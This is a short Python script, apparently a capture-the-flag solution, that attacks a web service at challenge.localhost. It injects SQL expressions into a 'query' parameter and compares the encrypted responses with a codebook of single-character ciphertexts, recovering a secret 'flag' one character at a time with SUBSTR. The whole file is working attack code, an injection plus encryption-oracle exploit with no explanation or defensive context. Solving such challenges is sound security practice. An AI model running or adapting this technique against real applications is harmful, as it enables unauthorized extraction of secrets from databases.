import requests
from urllib.parse import quote
from Crypto.Util.Padding import pad
from base64 import *

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!?."

def build_codebook():
    codebook = {}
    for c in charset:
        # Get encryption of the character with proper padding
        payload = f"'{c}'"
        r = requests.get(f"http://challenge.localhost/?query={quote(payload)}")
        ct = b64decode(r.text.split("<pre>")[2].split("</pre>")[0])
        codebook[ct] = c
    return codebook

def extract_flag(codebook):
    flag = ""
    i = 1
    while True:
        # Get encryption of the i-th character
        payload = f"SUBSTR(flag,{i},1)"
        r = requests.get(f"http://challenge.localhost/?query={quote(payload)}")
        ct = b64decode(r.text.split("<pre>")[2].split("</pre>")[0])
        
        if ct not in codebook:
            break
            
        flag += codebook[ct]
        print(f"Found: {flag}")
        i += 1
    
    return flag

# Main execution
print("Building codebook...")
codebook = build_codebook()
print(f"Codebook contains {len(codebook)} entries")

print("\nExtracting flag...")
flag = extract_flag(codebook)
print("\nFinal flag:", flag)
